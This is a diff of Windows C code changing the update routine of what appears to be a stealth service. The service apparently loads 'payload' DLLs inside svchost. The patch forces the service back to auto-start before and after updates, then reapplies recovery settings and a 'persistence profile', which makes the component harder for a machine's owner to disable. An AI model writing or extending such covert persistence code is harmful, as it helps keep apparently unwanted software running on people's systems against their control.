@@ -3537,18 +3537,26 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
     }
 
     // Disable restart mechanisms before stopping to avoid immediate re-launch.
+    // Keep the SCM start type repairable/auto-start: disabling it before old-image
+    // teardown can strand the endpoint if svchost terminates unexpectedly.
     StealthPersistenceState persisted = {0};
     BOOL havePersisted = Stealth_LoadPersistenceState(&persisted);
 
     DWORD originalStartType = SERVICE_AUTO_START;
-    BOOL disabledStartType = FALSE;
     if (serviceExists)
     {
-        (void)Stealth_QueryServiceStartType(serviceKeyName, &originalStartType);
-        disabledStartType = Stealth_SetServiceStartType(serviceKeyName, SERVICE_DISABLED);
-        if (!disabledStartType)
+        if (!Stealth_QueryServiceStartType(serviceKeyName, &originalStartType))
         {
-            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to disable service start type (%ls, error=%lu)", serviceKeyName, GetLastError());
+            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Unable to query service start type before update (%ls, error=%lu)", serviceKeyName, GetLastError());
+            originalStartType = SERVICE_AUTO_START;
+        }
+        if (originalStartType != SERVICE_AUTO_START)
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Repairing service start type before update (%ls, original=%lu target=%lu)", serviceKeyName, originalStartType, (DWORD)SERVICE_AUTO_START);
+        }
+        if (!Stealth_SetServiceStartType(serviceKeyName, SERVICE_AUTO_START))
+        {
+            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to ensure service auto-start before update (%ls, error=%lu)", serviceKeyName, GetLastError());
         }
     }
 
@@ -3646,9 +3654,10 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
     Stealth_RemoveInactiveSvchostPayloadDlls(&paths);
 
 CLEANUP:
-    if (disabledStartType)
+    if (serviceExists && !Stealth_SetServiceStartType(serviceKeyName, SERVICE_AUTO_START))
     {
-        (void)Stealth_SetServiceStartType(serviceKeyName, originalStartType);
+        Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to restore service auto-start during cleanup (%ls, error=%lu)", serviceKeyName, GetLastError());
+        success = FALSE;
     }
     Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
     Stealth_ApplyPersistenceProfile();
